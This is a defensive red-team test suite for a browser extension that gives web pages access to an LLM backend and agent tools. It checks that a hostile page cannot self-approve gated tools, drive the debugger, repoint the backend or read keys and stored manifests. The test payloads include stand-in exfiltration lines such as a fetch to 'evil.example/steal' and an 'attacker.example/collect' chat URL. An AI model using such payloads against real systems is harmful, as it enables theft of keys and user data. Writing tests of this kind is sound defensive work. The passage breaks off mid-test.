// tests/redteam.test.js — ADVERSARIAL / red-team suite.
//
// THREAT MODEL (the important part). A hostile page ALREADY owns its own main world: window.ml is injected
// there and the page can run ANY JavaScript in its own context. So "trick the model into running exec" is NOT
// an attack — the page can already run JS by construction; and wasting GPU time is mere DoS. The ONLY
// interesting attacks are where the extension could be a CONFUSED DEPUTY and hand the page a capability it does
// not otherwise have:
//   (a) reads AS THE USER — its Google/site COOKIES (SOP + no-cookies stop the page itself),
//   (b) CORS / SOP-bypassing cross-origin & localhost reads (the page's own fetch can't read the bytes),
//   (c) the user's saved API KEY / repointing the LLM backend (MITM + exfil every prompt),
//   (d) the DEBUGGER (trusted input, cross-origin-iframe clicks, strict-page eval),
//   (e) SELF-APPROVING a gated privileged tool, so any of the above runs without the human.
//   (f) THE USER'S BACKEND AT ALL, from a site the user never approved: spending their models (local GPU time, or
//       money where a model routes to a paid API) and reading what the backend has. Not a "mere DoS" any more:
//       docs/spec/SITE_ACCESS.md makes every page-started message conditional on the page's origin being approved.
// Every attack below must be BLOCKED OUTRIGHT or APPROVAL-GATED. node:vm/jsdom — the trust boundary IS the
// message contract, exercised precisely.
//
// The credential / CORS / sandbox choke-points also have focused SECURITY tests in background.test.js — see
// the INDEX at the bottom. This file adds the attacker's-eye consolidation plus the control-plane (approval /
// CDP) and backend-repoint gains not covered there.
const { test } = require("node:test");
const assert = require("node:assert");
const { jsonResponse, streamResponse, loadBackground, loadPageWorld } = require("./helpers");
const { fakeNativeHost } = require("./fake-native-host.mjs");
const { HANDLE_MAP, PAGE_STARTED_TYPES, RUN_CONTROL_TYPES } = require("../src/page-relay.ts");

const baseConfig = (o = {}) => ({ chatUrl: "http://host/api/chat/completions", apiKey: "sk-SECRET-KEY", model: "default-model", apiFormat: "openai", ocrModel: "", ...o });
const hostilePage = (id = 9, url = "https://evil.example/attack") => ({ tab: { id, url }, url });   // sender.tab set + web origin
const tick = () => new Promise((r) => setTimeout(r, 5));

// The attacker owns window.postMessage, which content.js no longer hears (SITE_PRESENCE step 2b): asserted here for every
// probe. Its strongest position is injected.js's port, which a page given injected.js after it loaded can take from the
// hand-off. Which background messages can it get RELAYED through that? Only HANDLE_MAP *_REQUEST types; everything else
// the content script drops. Returns the forwarded bg types.
async function pageRelays(...msgs) {
    const world = loadPageWorld({ onRuntimeMessage: () => ({ data: null }) });
    await tick();
    const boot = world.runtimeCalls.length;
    for (const m of msgs) world.context.window.postMessage(m);
    await tick();
    assert.deepEqual(world.runtimeCalls.slice(boot).map((c) => c.type), [], "a message on the page's window relayed something");
    for (const m of msgs) world.asInjected(m);
    await tick();
    return world.runtimeCalls.map((c) => c.type);
}

// ── (e) SELF-APPROVAL — the crux ─────────────────────────────────────────────────────────────────────────
test("GAIN blocked — self-approve a gated tool: a hostile page CANNOT forge SET_APPROVAL", async () => {
    // Design A puts the approval gate in the background, resolved ONLY by a trusted extension surface. A page
    // relays only HANDLE_MAP *_REQUEST types, and there is NO SET_APPROVAL(_REQUEST) — so the page can never
    // resolve its own run's gate. Every gated privileged tool (credentialed fetch, full-mode python, CDP) thus
    // stays blocked on the human. (Positive control: a legit CONFIG_REQUEST DOES relay — the drop is real.)
    const relayed = await pageRelays(
        { type: "CONFIG_REQUEST", requestId: "ctrl", payload: {} },                                       // legit → relays
        { type: "SET_APPROVAL", requestId: "a", payload: { runId: "victim", seq: 1, decision: true } },
        { type: "SET_APPROVAL_REQUEST", requestId: "b", payload: { runId: "victim", seq: 1, decision: true } },
    );
    assert.ok(relayed.includes("GET_CONFIG"), "positive control: a real request type still relays");
    assert.ok(!relayed.includes("SET_APPROVAL"), "a page's SET_APPROVAL never reaches the background — it can't self-approve");
});

// ── (d) THE DEBUGGER ─────────────────────────────────────────────────────────────────────────────────────
test("GAIN blocked — drive the debugger: a hostile page CANNOT forge a CDP click / CDP exec message", async () => {
    // CDP (trusted input events, cross-origin-iframe clicks, strict-page eval) is a capability the page lacks.
    // There is NO page-relayable CDP message; CDP fires ONLY inside the background loop, after approval, on the
    // human-approved args — never a page-supplied value.
    const relayed = await pageRelays(
        { type: "CDP_CLICK", requestId: "a", payload: { x: 1, y: 2, tabId: 9 } },
        { type: "CDP_CLICK_REQUEST", requestId: "b", payload: { x: 1, y: 2, tabId: 9 } },
        { type: "CDP_EXEC", requestId: "c", payload: { source: "fetch('https://evil.example/steal')", tabId: 9 } },
        { type: "CDP_EXEC_REQUEST", requestId: "d", payload: { source: "x", tabId: 9 } },
    );
    assert.ok(!relayed.some((t) => /CDP/.test(t)), "no CDP message is ever relayed from a page");
});

// ── (c) THE SAVED KEY / THE BACKEND ──────────────────────────────────────────────────────────────────────
test("GAIN blocked — repoint the LLM backend: FETCH_LLM ignores page-supplied chatUrl/apiKey", async () => {
    // Repointing the model call to the attacker's server would MITM + exfil EVERY prompt and hand over the
    // saved key. A page may relay FETCH_LLM (its own model access is fine), but the URL + key come ONLY from
    // the saved config — never the payload — so the request always hits the real host with the real key.
    let sawUrl = null, sawAuth = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (c) => { sawUrl = c.url; sawAuth = (c.opts?.headers || {}).Authorization; return jsonResponse({ choices: [{ message: { content: "ok" } }] }); },
    });
    await bg.send({ type: "FETCH_LLM", payload: {
        messages: [{ role: "user", content: "a secret prompt" }], model: "default-model", think: null,
        chatUrl: "http://attacker.example/collect", apiKey: "sk-ATTACKER",   // injected overrides — must be IGNORED
    } }, hostilePage());
    assert.ok(sawUrl && sawUrl.startsWith("http://host/"), `prompts went to the SAVED host, not the attacker (${sawUrl})`);
    assert.ok(!/attacker/.test(sawUrl || ""), "never the injected chatUrl");
    if (sawAuth) assert.ok(/sk-SECRET-KEY/.test(sawAuth) && !/ATTACKER/.test(sawAuth), "the SAVED key is sent, never the injected one");
});

test("GAIN blocked — read the saved API key: GET_CONFIG never exposes apiKey / chatUrl / modelFilter to a page", async () => {
    const bg = loadBackground({ config: baseConfig({ modelFilter: "^ok" }) });
    const res = await bg.send({ type: "GET_CONFIG", payload: {} }, hostilePage());
    const keys = Object.keys(res.data || {});
    assert.ok(!keys.includes("apiKey") && !keys.includes("chatUrl"), `the secret config is never exposed (${keys.join()})`);
    assert.ok(!keys.includes("modelFilter"), "the model-filter (a guard the page shouldn't be able to read/probe) is withheld too");
});

test("GAIN blocked — call an off-list / expensive model: SET_MODEL rejects a model outside the server list", async () => {
    // Model access is the one thing a page CAN change — but only to a server-listed model, and (with a filter)
    // only a whitelisted one. A page can't point the wrapper at an arbitrary/expensive cloud model it names.
    const bg = loadBackground({ config: baseConfig(), listModels: () => ({ data: ["good-1", "good-2"] }) });
    const res = await bg.send({ type: "SET_MODEL", payload: { model: "expensive-cloud-gpt" } }, hostilePage());
    assert.ok(res.error && /not|unknown|available|list/i.test(res.error), `an unlisted model is rejected (${JSON.stringify(res)})`);
});

// ── (a) READS AS THE USER — the flagship exfil (cross-referenced; asserted from the attacker's side) ───────
test("GAIN blocked — read a private sheet AS THE USER: an unapproved page gets NO credentialed FETCH_SHEET", async () => {
    // The page can't read a private Google Sheet itself (SOP, and it has no Google cookies in its own fetch).
    // The extension's credentialed background fetch could be a confused deputy — so a non-whitelisted page with
    // no per-sheet approval must be REFUSED, and the user's cookies must never be spent.
    let opts = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (c) => { opts = c.opts; return { ok: true, status: 200, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="Private - Sheet1.csv"' : "text/csv" }, text: async () => "Name,SSN\nAda,111-22-3333\n" }; },
    });
    const res = await bg.send(
        { type: "FETCH_SHEET", payload: { url: "https://docs.google.com/spreadsheets/d/VICTIM_SHEET_ID/export?format=csv&gid=0" } },
        hostilePage());
    assert.ok(res.error && /not (approved|whitelisted)|refus|consent/i.test(res.error), `refused (would-be leak: ${JSON.stringify(res.data)})`);
    assert.notEqual(opts?.credentials, "include", "the user's Google cookies are NEVER spent on an unapproved sheet");
});

// ── INDEX — the remaining confused-deputy capability gains, each covered by a focused SECURITY test ─────────
// (a) read any URL AS THE USER (cookies)      → background.test.js "SECURITY (FETCH_URL credentialed): ... without a grant"
// (b) CORS/SOP-bypass cross-origin & localhost → background.test.js "SECURITY (FETCH_URL): an untrusted page with NO consent is refused"
// (b) SSRF probe of the internal network       → background.test.js "SECURITY (FETCH_IMAGE_B64): must refuse internal/loopback/metadata"
// (a/b) read any URL's bytes AS THE USER       → redteam-image-fetch.test.mjs (no cookies, image bytes only, uniform errors)
// (b/d) networked, CORS-bypassing python fetch → background.test.js "SECURITY (PYTHON_EXEC): ... must NOT get FULL (unhardened) mode"
// (e) a page-provided approve()/confirm can't self-approve (page loop) → agent.test.js "[HOLE→design-A] a hostile CALLER's approve:()=>true can NOT self-approve"

// ── (f) THE BACKEND FROM AN UNAPPROVED SITE (docs/spec/SITE_ACCESS.md) ──────────────────────────────────────
// ENUMERATED, not sampled: every type a page can make the background receive is read from page-relay.ts, so a type
// added there tomorrow is covered here without anyone editing this file. `siteGate: true` runs the real gate (the
// harness otherwise approves a test page's origin, because the older tests here are about what a handler does).

/** Send `type` from `sender` with a minimal payload, and report what reached the outside world as a result. */
async function attempt(bg, type, sender) {
    const before = { fetches: bg.calls.length, tabMessages: bg.tabMessages.length, captures: bg.captures.length };
    const res = await bg.send({ type, payload: { messages: [{ role: "user", content: "hi" }], url: "https://example.com/", runId: "run-x" }, requestId: "r1", event: { kind: "chat", id: "x", ts: 1, session: { hash: "x", turn: 0 } } }, sender);
    await tick();
    return { res, fetched: bg.calls.length - before.fetches, toTabs: bg.tabMessages.length - before.tabMessages, captured: bg.captures.length - before.captures };
}

test("GAIN blocked — EVERY page-started message type is refused from an unapproved origin, before any handler runs", async () => {
    assert.ok(PAGE_STARTED_TYPES.size >= 30, `enumerated ${PAGE_STARTED_TYPES.size} types — the relay list was not read`);
    for (const type of PAGE_STARTED_TYPES) {
        const bg = loadBackground({ config: baseConfig(), siteGate: true, onFetch: () => jsonResponse({ choices: [{ message: { content: "spent" } }] }) });
        const { res, fetched, toTabs, captured } = await attempt(bg, type, hostilePage());
        assert.match(res?.error || "", /Refused: https:\/\/evil\.example is not approved/, `${type}: answered with the refusal`);
        assert.deepEqual({ fetched, toTabs, captured }, { fetched: 0, toTabs: 0, captured: 0 }, `${type}: nothing reached the backend, a tab or the screen`);
    }
});

test("GAIN blocked — a sender that can never be granted is refused even when its host IS approved", async () => {
    const approved = { ml_site_always: ["https://ok.example"] };
    const cases = [
        ["an opaque origin (sandboxed frame)", { tab: { id: 4, url: "https://ok.example/" }, url: "https://ok.example/", origin: "null" }, /opaque origin/],
        ["a sub-frame", { tab: { id: 4, url: "https://ok.example/" }, url: "https://ok.example/f", origin: "https://ok.example", frameId: 3 }, /top frame/],
        ["a file: page", { tab: { id: 4, url: "file:///tmp/x.html" }, url: "file:///tmp/x.html" }, /http or https/],
        ["the same host over http", { tab: { id: 4, url: "http://ok.example/" }, url: "http://ok.example/" }, /http:\/\/ok\.example is not approved/],
    ];
    for (const [what, sender, why] of cases) {
        const bg = loadBackground({ config: baseConfig(), siteGate: true, local: approved, onFetch: () => jsonResponse({ choices: [{ message: { content: "spent" } }] }) });
        const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, sender);
        assert.match(res?.error || "", why, what);
        assert.equal(bg.calls.length, 0, `${what}: no model call`);
    }
    // The approved origin itself, top frame: through.
    const bg = loadBackground({ config: baseConfig(), siteGate: true, local: approved, onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, { tab: { id: 4, url: "https://ok.example/a" }, url: "https://ok.example/a", origin: "https://ok.example", frameId: 0 });
    assert.equal(res.data, "ok");
});

test("GAIN blocked — a revoke takes effect on the NEXT message, with no reload; a denial beats an approval", async () => {
    const bg = loadBackground({ config: baseConfig(), siteGate: true, local: { ml_site_always: ["https://evil.example"] }, onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    const chat = () => bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, hostilePage());
    assert.equal((await chat()).data, "ok", "approved: through");
    bg.localStore.ml_site_denied = ["https://evil.example"];
    assert.match((await chat()).error, /not allowed to use window\.ml/, "denied while still on the approved list: refused");
    bg.localStore.ml_site_denied = [];
    bg.localStore.ml_site_always = [];
    assert.match((await chat()).error, /not approved/, "revoked: the very next message is refused");
});

test("GAIN blocked — a page cannot approve ITSELF: SITE_ACCESS answers extension pages only", async () => {
    const bg = loadBackground({ config: baseConfig(), siteGate: true });
    const res = await bg.send({ type: "SITE_ACCESS", payload: { edit: { op: "allow", origin: "https://evil.example", scope: "always" } } }, hostilePage());
    assert.equal(res.error, "refused");
    assert.equal(bg.localStore.ml_site_always, undefined, "nothing was written");
    // And the content script would not relay it anyway: it is not a page request type.
    assert.deepEqual(await pageRelays({ type: "SITE_ACCESS_REQUEST", requestId: "a", payload: {} }, { type: "SITE_ACCESS", requestId: "b", payload: {} }), []);
    // The extension's own settings page can.
    const ok = await bg.send({ type: "SITE_ACCESS", payload: { edit: { op: "allow", origin: "https://ok.example", scope: "session" } } }, { url: "chrome-extension://test/sidebar.html" });
    assert.deepEqual(ok.data.lists.session, ["https://ok.example"]);
});

// --- the MANIFESTS store is the extension's alone (docs/spec/PROGRAM_MANIFEST.md, "Registering a program", the store's ruling of 2026-10-23) ---
// A stored manifest makes a program's calls free under the sandbox (B5), so a page that could store one would be
// describing its own way in, and one that could read the store learns the pin of a program the person registered.
// `MANIFESTS` answers extension pages only (background.ts, `isExtensionSender`). The red-team pass for the type.

/** A stored entry whose every field is a marker the leak check can recognise. */
const MARKED = {
    program: "rt-marker-tool",
    version: { range: "*", args: [], pattern: "" },
    command: { effects: ["read"], paths: "operands", flags: {} },
};
const MARKED_PIN = { path: "/opt/rt-marker/bin/rt-marker-tool", fingerprint: "1:2:3:4-rt-marker", inRoot: false };
const EXT_PAGE = { url: "chrome-extension://test/sidebar.html" };

// Since #1063 an add is pinned by the HOST, so the positive control needs a host whose facts carry the markers
// (the payload's pin is ignored). `root-k` found that these three tests called add with ml.sh off and got { error }.
const MARKER_FACTS = (args) => ({
    argv: args.argv, program: { path: MARKED_PIN.path, inRoot: false, fingerprint: MARKED_PIN.fingerprint },
    cwd: { path: args.cwd, inRoot: true }, env: { set: [], secrets: [], free: true }, repo: null, repoConfigRunsCode: null,
    paths: [], effects: "unknown", mode: "host", sandboxed: true, placement: "host-sandbox",
});
/** A worker with ml.sh on over `roots` and a host that resolves `rt-marker-tool` to the markers. */
function withMarkerHost(roots = ["/work/rt"], extra = {}) {
    const host = fakeNativeHost({ landlockAbi: null, facts: MARKER_FACTS });
    const bg = loadBackground({ config: baseConfig({ shellEnabled: true, shellRoots: roots }), siteGate: true, onNative: host.onNative, ...extra });
    return { bg, host };
}

test("GAIN blocked — a page cannot list, add or remove a manifest: MANIFESTS is the extension's alone", async () => {
    // Not a page-started type and not a page request type, so the content script drops it before the background
    // sees it; and the handler's own gate refuses it if it ever does. The oracle: nothing stored, nothing spent.
    assert.ok(!PAGE_STARTED_TYPES.has("MANIFESTS"), "MANIFESTS is page-startable");
    assert.ok(!("MANIFESTS" in HANDLE_MAP) && !Object.values(HANDLE_MAP).some((e) => e.type === "MANIFESTS" || e.responseType === "MANIFESTS"), "MANIFESTS is in HANDLE_MAP");
    const relayed = await pageRelays(
        { type: "CONFIG_REQUEST", requestId: "ctrl", payload: {} },   // positive control
        { type: "MANIFESTS", requestId: "a", payload: { op: "list" } },
        { type: "MANIFESTS_REQUEST", requestId: "b", payload: { op: "list" } },
        { type: "MANIFESTS", requestId: "c", payload: { op: "add", scope: "global", manifest: MARKED, pin: MARKED_PIN } },
    );
    assert.ok(relayed.includes("GET_CONFIG"), "positive control: a real request type still relays");
    assert.deepEqual(relayed.filter((t) => t !== "GET_CONFIG"), [], `relayed: ${relayed}`);

    const { bg } = withMarkerHost([ "/work/rt" ], { onFetch: () => jsonResponse({ choices: [{ message: { content: "spent" } }] }) });
    const payloads = [
        {},
        { op: "list" },
        { op: "add", scope: "global", manifest: MARKED, pin: MARKED_PIN },
        { op: "add", scope: "workspace", root: "/work/rt", manifest: MARKED, pin: { ...MARKED_PIN, inRoot: true } },
        { op: "remove", id: "man-x" },
    ];
    for (const payload of payloads) {
        const before = { fetches: bg.calls.length, toTabs: bg.tabMessages.length, captured: bg.captures.length };
        const res = await bg.send({ type: "MANIFESTS", payload }, hostilePage());
        await tick();
        assert.equal(res?.error, "refused", `a page sender is refused: ${JSON.stringify(payload)}`);
        assert.deepEqual(
            { fetched: bg.calls.length - before.fetches, toTabs: bg.tabMessages.length - before.toTabs, captured: bg.captures.length - before.captured },
            { fetched: 0, toTabs: 0, captured: 0 }, `${JSON.stringify(payload)}: nothing reached the backend, a tab or the screen`);
    }
    assert.equal(bg.localStore.ml_manifests_global, undefined, "nothing the page sent was stored");
    assert.equal(bg.localStore.ml_manifests_workspace, undefined, "nothing the page sent was stored, in either scope");
    // Positive control: the extension's own registration page does all three.
    const added = JSON.parse(JSON.stringify(await bg.send({ type: "MANIFESTS", payload: { op: "add", scope: "global", manifest: MARKED, pin: MARKED_PIN } }, EXT_PAGE)));
    assert.equal(added.data.global.length, 1, "positive control: an extension page can add");
    assert.deepEqual((await bg.send({ type: "MANIFESTS", payload: {} }, EXT_PAGE)).data.global.length, 1, "positive control: an extension page can list");
    const removed = JSON.parse(JSON.stringify(await bg.send({ type: "MANIFESTS", payload: { op: "remove", id: added.data.global[0].id } }, EXT_PAGE)));
    assert.deepEqual(removed.data.global, [], "positive control: an extension page can remove");
});

test("GAIN blocked — a stored manifest never reaches a page", async () => {
    // Store one with a marker in every field, then read every page-reachable surface. The store is the person's
    // (a pin names a file on THIS machine), so a page that can read it learns what they registered.
    const { bg } = withMarkerHost([ "/work/rt" ], { onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    const added = JSON.parse(JSON.stringify(await bg.send({ type: "MANIFESTS", payload: { op: "add", scope: "global", manifest: MARKED, pin: MARKED_PIN, origin: "proposed" } }, EXT_PAGE)));
    assert.equal(added.data.global.length, 1, "positive control: the extension page stored one");
    const markerId = added.data.global[0].id;
    const MARKERS = ["rt-marker-tool", "/opt/rt-marker", "1:2:3:4-rt-marker", markerId, "ml_manifests_global"];
    const pageSender = hostilePage();
    // The MANIFESTS route itself: refused, with no data.
    for (const payload of [{}, { op: "list" }, { op: "add", scope: "global", manifest: MARKED, pin: MARKED_PIN }, { op: "remove", id: markerId }]) {
        const res = await bg.send({ type: "MANIFESTS", payload }, pageSender);
        assert.equal(res?.error, "refused", `MANIFESTS ${JSON.stringify(payload)}`);
        assert.equal(res?.data, undefined, `MANIFESTS ${JSON.stringify(payload)}: no view reaches a page`);
    }
    // Every page-started type, with a payload that asks for the store by name: none of them answer with it.
    assert.ok(PAGE_STARTED_TYPES.size >= 30, `enumerated ${PAGE_STARTED_TYPES.size} types — the relay list was not read`);
    for (const type of PAGE_STARTED_TYPES) {
        const res = await bg.send({
            type,
            payload: { messages: [{ role: "user", content: "hi" }], url: "https://example.com/", runId: "run-x", op: "list", scope: "global", id: markerId, name: "manifests" },
            requestId: "r1", event: { kind: "chat", id: "x", ts: 1, session: { hash: "x", turn: 0 } },
        }, pageSender);
        await tick();
        const seen = JSON.stringify([res, bg.tabMessages, bg.captures]);
        for (const m of MARKERS) assert.ok(!seen.includes(m), `${type} handed a page the stored manifest (${m}): ${seen.slice(0, 200)}`);
    }
    // Positive control: the extension page's own list still carries every marker.
    const view = JSON.stringify((await bg.send({ type: "MANIFESTS", payload: {} }, EXT_PAGE)).data);
    for (const m of ["rt-marker-tool", "/opt/rt-marker", "1:2:3:4-rt-marker", markerId]) assert.ok(view.includes(m), `positive control: the extension page reads ${m}`);
});

test("GAIN blocked — a page cannot mint a stored entry with origin \"proposed\" or \"person\"", async () => {
    // `origin` decides how widely a manifest describes a call (B5: "person" on both placements, "proposed" only
    // under the OS sandbox). A page that could claim either would be choosing its own privilege. The handler
    // hardcodes the person's word and reads no `origin` from the payload, so the claim never becomes an entry.
    const { bg } = withMarkerHost([ "/work/rt" ]);
    for (const origin of ["proposed", "person", "shipped", "", undefined, null, 42, { toString: () => "person" }]) {
        const res = await bg.send({ type: "MANIFESTS", payload: { op: "add", scope: "global", manifest: MARKED, pin: MARKED_PIN, origin } }, hostilePage());
        assert.equal(res?.error, "refused", `origin ${JSON.stringify(origin)}: the page is refused before origin is read`);
    }
    assert.equal(bg.localStore.ml_manifests_global, undefined, "no entry was minted under any claimed origin");
    assert.equal(bg.localStore.ml_manifests_workspace, undefined, "no entry was minted in either scope");
    // Even a page that got through the gate could not claim "proposed": the handler's add is always the person's.
    // (Which is the RIGHT direction for a page — it cannot downgrade itself to the sandbox-only draft either.)
    const ext = JSON.parse(JSON.stringify(await bg.send({ type: "MANIFESTS", payload: { op: "add", scope: "global", manifest: MARKED, pin: MARKED_PIN, origin: "proposed" } }, EXT_PAGE)));
    assert.equal(ext.data.global[0].origin, "person", "the extension page's word is the person's; a payload origin is never read");
    // And an entry whose stored `origin` is neither of the two is dropped on read, never repaired into one.
    // (A fresh worker: the store reads storage once at boot, so a forged entry is met on that read.)
    const forged = { id: "man-forged", scope: "global", created: 1, manifest: MARKED, origin: "shipped", pin: MARKED_PIN };
    const again = loadBackground({ config: baseConfig(), local: { ml_manifests_global: [forged] } });
    await tick();
    const reloaded = JSON.parse(JSON.stringify(await again.send({ type: "MANIFESTS", payload: {} }, EXT_PAGE)));
    assert.deepEqual(reloaded.data.global, [], "a forged origin does not survive a read");
});

test("GAIN blocked — an extension page's add with ml.sh off answers {error} and stores nothing", async () => {
    // #1063's rule: an add is pinned by the host, so one with no host (ml.sh off) cannot be pinned and is refused.
    // Without this pin the rule is what broke these three tests' positive controls and nothing would notice again.
    const bg = loadBackground({ config: baseConfig(), siteGate: true });
    const res = JSON.parse(JSON.stringify(await bg.send({ type: "MANIFESTS", payload: { op: "add", scope: "global", manifest: MARKED, pin: MARKED_PIN } }, EXT_PAGE)));
    assert.match(res.error, /^ml\.sh is not available/);
    assert.equal(res.data, undefined);
    assert.equal(bg.localStore.ml_manifests_global, undefined, "nothing was stored");
    assert.equal(bg.localStore.ml_manifests_workspace, undefined, "in either scope");
    // A list still works with no host: the store is storage, not the host.
    const listed = JSON.parse(JSON.stringify(await bg.send({ type: "MANIFESTS", payload: {} }, EXT_PAGE)));
    assert.deepEqual([listed.data.global, listed.data.workspace], [[], []]);
});

test("GAIN blocked — an entrypoint manifest cannot name a shipped program and shadow its shipped manifest (B2)", async () => {
    const S = require("../src/shell/stored-manifests.ts");
    const { SHIPPED_MANIFESTS, manifestFor, manifestsFor } = require("../src/shell/sh-call.ts");
    const ENTRY = { program: "git", entrypoint: { path: "scripts/x.mjs", sha256: "a".repeat(64) }, command: { effects: [], paths: "none", flags: {} } };
    const BIN = { program: "git", version: { range: "*", args: [], pattern: "" }, command: { effects: [], paths: "none", flags: {} } };
    const GEN_OK = { program: "node", entrypoint: { path: "scripts/x.mjs", sha256: "a".repeat(64) }, command: { effects: [], paths: "none", flags: {} } };

    // Positive controls: the B2 fix works for a binary, and a non-shipped entrypoint manifest is the store's to keep.
    assert.match(S.storeRefusal({ scope: "global", manifest: BIN, origin: "person", pin: { path: "/usr/bin/git", fingerprint: "1:2:3:4", inRoot: false } }, [], SHIPPED_MANIFESTS) ?? "kept", /src\/shell\/manifests\/git\.json/, "control: a binary entry for a shipped program is refused");
    assert.equal(S.validStored({ id: "man-bin", created: 1, scope: "global", manifest: BIN, origin: "person", pin: { path: "/usr/bin/git", fingerprint: "1:2:3:4", inRoot: false } }, "global", SHIPPED_MANIFESTS), false, "control: a hand-written binary entry for a shipped program is dropped on load");
    assert.equal(S.storeRefusal({ scope: "workspace", root: "/w", manifest: GEN_OK, origin: "person" }, [], SHIPPED_MANIFESTS), undefined, "control: an entrypoint manifest for a program no shipped manifest describes is kept");
    assert.equal(S.validStored({ id: "man-node", created: 1, scope: "workspace", root: "/w", manifest: GEN_OK, origin: "person" }, "workspace", SHIPPED_MANIFESTS), true, "control: and it survives a load");

    // Defended: an entrypoint manifest naming a shipped program is the same hole B2 closed for a binary.
    assert.match(S.storeRefusal({ scope: "workspace", root: "/w", manifest: ENTRY, origin: "person" }, [], SHIPPED_MANIFESTS) ?? "kept", /src\/shell\/manifests\/git\.json/, "an entrypoint manifest for a shipped program is refused at store time");
    assert.equal(S.validStored({ id: "man-ent", created: 1, scope: "workspace", root: "/w", manifest: ENTRY, origin: "person" }, "workspace", SHIPPED_MANIFESTS), false, "and a hand-written one is dropped on load (both scopes; an entrypoint manifest is always workspace-scoped)");

    // And it is a shadow, not a curiosity: the call path reads the entrypoint entry first.
    const stored = [{ id: "man-ent", scope: "workspace", root: "/w", manifest: ENTRY, origin: "person", created: 1 }];
    const hit = manifestFor(["git", "scripts/x.mjs", "--help"], { cwd: "/w", roots: ["/w"] }, manifestsFor(stored, ["/w"]).list);
    assert.ok(!hit?.entrypoint, `git scripts/x.mjs must be described by the shipped manifest, got ${JSON.stringify(hit && { program: hit.program, entrypoint: hit.entrypoint })}`);
});

test("GAIN blocked — a site trusted to self-gate (pageApprovalDomains) is approved over https, never over plain http", async () => {
    const bg = loadBackground({ config: baseConfig({ pageApprovalDomains: ["trusted.example"] }), siteGate: true, onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, { tab: { id: 2, url: "https://trusted.example/" }, url: "https://trusted.example/" });
    assert.equal(res.data, "ok");
    const http = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, { tab: { id: 2, url: "http://trusted.example/" }, url: "http://trusted.example/" });
    assert.match(http.error, /not approved/, "the whitelist is keyed by host; over http it would trust whoever is on the wire");
});

// --- (f) slice 3: the agent level and the self-approval list, by origin, written only by the extension ---

test("GAIN blocked — a self-approving site the person denied, then stopped denying, does not get its self-approval back", async () => {
    const bg = loadBackground({ config: baseConfig({ cdp: true }), siteGate: true, local: { ml_site_schema: 2, ml_site_always: ["https://trusted.example"], ml_site_selfapprove: ["https://trusted.example"] } });
    const popup = { url: "chrome-extension://test/popup.html" };
    await bg.send({ type: "SITE_ACCESS", payload: { edit: { op: "deny", origin: "https://trusted.example" } } }, popup);
    const after = await bg.send({ type: "SITE_ACCESS", payload: { origin: "https://trusted.example", edit: { op: "undeny", origin: "https://trusted.example" } } }, popup);
    assert.equal(after.data.decision, "unknown");
    const page = { tab: { id: 2, url: "https://trusted.example/" }, url: "https://trusted.example/", origin: "https://trusted.example", frameId: 0 };
    assert.match((await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, page)).error, /not approved/);
    assert.equal(bg.debuggerCalls.filter((c) => c[0] === "attach").length, 0);
});

test("GAIN blocked — http://host, with the host on the old whitelist, is not 'whitelisted' for CDP_CLICK, even once allowed to use window.ml", async () => {
    // Regression for #628, kept through the slice 3 move of the whitelist to local origins: the old sync list of hosts
    // is migrated to `https://host`, never to the http origin.
    const bg = loadBackground({ config: baseConfig({ cdp: true, pageApprovalDomains: ["trusted.example"] }), siteGate: true, local: { ml_site_always: ["http://trusted.example"] } });
    const http = { tab: { id: 2, url: "http://trusted.example/" }, url: "http://trusted.example/", origin: "http://trusted.example", frameId: 0 };
    const res = await bg.send({ type: "CDP_CLICK", payload: { x: 1, y: 2 } }, http);
    assert.match(String(res?.error), /Refused/);
    assert.equal(bg.debuggerCalls.filter((c) => c[0] === "attach").length, 0, "the debugger was attached for the http origin");
});

test("GAIN blocked — GET_CONFIG answers pageApprovalAllowed: false to http://host when the old whitelist named the host", async () => {
    const bg = loadBackground({ config: baseConfig({ pageApprovalDomains: ["trusted.example"] }), siteGate: true, local: { ml_site_always: ["http://trusted.example"] } });
    const http = await bg.send({ type: "GET_CONFIG", payload: {} }, { tab: { id: 2, url: "http://trusted.example/" }, url: "http://trusted.example/", origin: "http://trusted.example", frameId: 0 });
    assert.equal(http.data.pageApprovalAllowed, false);
    const https = await bg.send({ type: "GET_CONFIG", payload: {} }, { tab: { id: 2, url: "https://trusted.example/" }, url: "https://trusted.example/", origin: "https://trusted.example", frameId: 0 });
    assert.equal(https.data.pageApprovalAllowed, true, "positive control: the https origin");
});

test("GAIN blocked — a page cannot write ml_site_agents or ml_site_selfapprove through any page-started type, SITE_ACCESS included", async () => {
    // The page is approved and even self-approving, the strongest a page gets: it still edits no level.
    const edits = [
        { op: "agents", origin: "https://evil.example", level: "always" },
        { op: "agents", origin: "https://victim.example", level: "denied" },
        { op: "selfApprove", origin: "https://evil.example", on: true },
        { op: "selfApprove", origin: "https://friend.example", on: false },
    ];
    const local = { ml_site_always: ["https://evil.example", "https://victim.example"], ml_site_agents: { "https://victim.example": "ask" }, ml_site_selfapprove: ["https://friend.example"], ml_site_schema: 2 };
    const sender = () => ({ tab: { id: 9, url: "https://evil.example/attack" }, url: "https://evil.example/attack", origin: "https://evil.example", frameId: 0 });
    for (const type of ["SITE_ACCESS", ...PAGE_STARTED_TYPES]) for (const edit of edits) {
        const bg = loadBackground({ config: baseConfig(), siteGate: true, siteAgents: null, local: structuredClone(local), onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
        await Promise.race([bg.send({ type, payload: { edit, origin: edit.origin, tools: [], messages: [{ role: "user", content: "hi" }] } }, sender()), tick()]);
        await tick();
